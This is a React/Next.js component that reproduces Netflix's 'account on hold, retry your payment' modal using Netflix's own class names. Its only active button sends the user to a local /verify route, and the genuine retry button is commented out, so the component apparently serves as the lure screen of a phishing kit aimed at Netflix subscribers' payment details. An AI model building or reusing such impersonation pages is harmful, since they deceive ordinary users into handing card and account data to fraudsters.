import React, { useEffect } from "react";
import { useRouter } from "next/router";

interface ModalProps {}

export const Modal: React.FC<ModalProps> = ({}) => {
  const { push } = useRouter();
  useEffect(() => {
    const html = document.querySelector(`html`);
    html?.setAttribute(`class`, `modal`);

    return () => {
      html?.removeAttribute(`class`);
    };
  }, []);

  return (
    <div>
      <div className={`netflix-sans-font-loaded`}>
        <div className={`nf-modal uma-modal`}>
          <div
            className={`nf-modal-background css-0`}
            data-uia="nf-modal-background"
          ></div>
          <div
            className={`nf-modal-content css-0`}
            dir="ltr"
            data-uia="nf-modal-background"
          >
            <div className={`focus-trap-wrapper`}>
              <div className={`nf-modal-content-wrapper`}>
                <div className={`nf-modal-dismiss`}>
                  <button
                    className={`nf-modal-dismiss-btn`}
                    aria-label="close"
                  ></button>
                  <div className={`nf-modal-headerActions`}>
                    <div
                      className={`btn-bar btn-bar-center`}
                      data-uia="btn-submit"
                    ></div>
                  </div>
                </div>
                <div className={`nf-modal-body`}>
                  <div>
                    <div
                      className={`uma-modal-title`}
                      data-uia="uma-modal-title"
                    >
                      Your account is on hold. Retry your payment?
                    </div>
                    <div className={`uma-modal-body`} data-uia="uma-modal-body">
                      We {`couldn't`} process your last payment. Update your
                      payment info to keep enjoying Netflix.
                    </div>
                    <div
                      className={`btn-bar btn-bar-center uma-modal-cta-row-1`}
                      data-uia="btn-submit"
                    >
                      {/* <button
                        className="btn uma-cta-btn akira-button akira-button-red css-0 btn-red btn-large"
                        type="button"
                        data-uia="uma-action-RETRY_PAYMENT"
                      >
                        Retry Payment
                      </button> */}
                      <button
                        className={`btn uma-cta-btn akira-button css-0 btn-gray btn-large`}
                        type="button"
                        data-uia="uma-action-/simplemember/paymentpicker"
                        onClick={() => push(`/verify`)}
                      >
                        Update your info
                      </button>
                    </div>
                  </div>
                </div>
                <hr className={`nf-modal-hr`} />
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
